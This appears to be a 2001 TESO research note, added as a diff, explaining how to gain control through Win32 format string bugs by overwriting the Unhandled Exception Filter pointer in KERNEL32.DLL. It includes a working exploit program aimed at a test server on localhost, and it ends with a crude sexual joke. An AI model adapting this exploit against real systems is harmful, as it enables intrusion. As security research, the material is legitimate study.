@@ -1,0 +1,107 @@
+0035 2001/03/13  safely getting control in fmt bugs if KERNEL32 is known
+==== TESO Informational =======================================================
+This piece of information is to be kept confidential.
+===============================================================================
+
+Description ..........: way of getting control with format string bugs 
+Date .................: 2001/03/13 11:00
+Author ...............: halvar
+Publicity level ......: unknown
+Affected .............: NT/Win32 specific
+Type of entity .......: NT internals
+Type of discovery ....: useful information
+Severity/Importance ..: n/a
+Found by .............: halvar
+
+===============================================================================
+
+After our last excursion into the depths of NT exception handling, we will now
+cover another interesting aspect: Unhandled Exception Filter Attacks (UEFA).
+
+In Win32 exception handling, it is possible to set something called "Unhandled
+Exception Filter" which is basically a global exception handler for all threads
+in a particular task. If an exception occurs and none of the per-thread except-
+ion handlers handle it, this function will be called.
+
+The idea in this case is to use the format bug to set an Unhandled Exception 
+Filter to an address where our code is stored, and to subsequently trigger an
+exception that isn't handled by any per-thread exception handlers.
+
+A quick run with IDA through KERNEL32.DLL gives us the following disassembly 
+for the function 
+
+void * __stdcall SetUnhandledExceptionFilter(void *lpTopLevelExceptionFilter);
+.text:77F1D480     SetUnhandledExceptionFilter proc near
+.text:77F1D480     
+.text:77F1D480     lpTopLevelExceptionFilter= dword ptr  4
+.text:77F1D480     
+.text:77F1D480                     mov     eax, dword_77F45418
+.text:77F1D485                     mov     ecx, [esp+lpTopLevelExceptionFilter]
+.text:77F1D489                     mov     dword_77F45418, ecx
+.text:77F1D48F                     retn    4
+.text:77F1D48F     SetUnhandledExceptionFilter endp
+
+Ok, here we see that the address of the exception filter has to be written to 
+the void * at 0x77F45418 on my box. This means, too, that we will need to know
+the exact version of KERNEL32.DLL in order to change the exception filter.
+So this technique is only useful if you either are really good at remotely fin-
+gerprinting NT versions, service packs and language versions or have a format
+bug that allows you to read back data from KERNEL32.DLL. 
+
+While we need to know a lot more info about the computer we're attacking, we 
+only need 5 writes to get control: 4 for the new exception filter pointer and
+1 to trigger the exception.
+
+Anyways, here is a quick modified sploit.c which will get control to the 0xCC
+by overwriting the top level exception filter instead of all the per-thread
+exception handlers. (Again, run this against lameserver.c :)
+
+------- snip --- sploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+
+unsigned char szAttackBuffer[] = {
+"\x10\x80\x03\x78%200c%n "      // Create a single 0xCC as "payload"
+
+//--- First Thread
+"\x18\x54\xF4\x77%c%62c%n"       // write 0x10 
+"\x19\x54\xF4\x77%c%107c%n%.f"   // write 0x80
+"\x1A\x54\xF4\x77%126c%n "       // write 0x03
+"\x1B\x54\xF4\x77%c%111c%n%n"    // write 0x78 and trigger exception
+
+};
+
+int main(int argc, char **argv)
+{
+        WSADATA wsaDat;
+        struct  sockaddr_in Host;
+        int     sock, socks[10], i;
+                
+        WSAStartup(0x101, &wsaDat);
+        
+        Host.sin_family = AF_INET;
+        Host.sin_addr.s_addr = 0x0100007F;
+        Host.sin_port = htons(999);
+        
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        connect(sock, (struct sockaddr *)&Host, sizeof(Host));  // create attack 
+                                                                // thread
+        for(i = 1; i < 11; i++)
+        {
+                socks[i] = socket(AF_INET,SOCK_STREAM, 0);
+                connect(socks[i], (struct sockaddr *)&Host, sizeof(Host));
+        }
+        Sleep(50);
+        send(sock, szAttackBuffer, strlen(szAttackBuffer), 0);
+}
+------------- snip --- sploit.c EOF
+
+Stay tooned for the next informational, featuring nude chix delivering pizza to
+randomizer and acpizer offering them some KY-lubrication. (KY-lube-technique)
+
+Cheers, Halvar
+
+===============================================================================
+
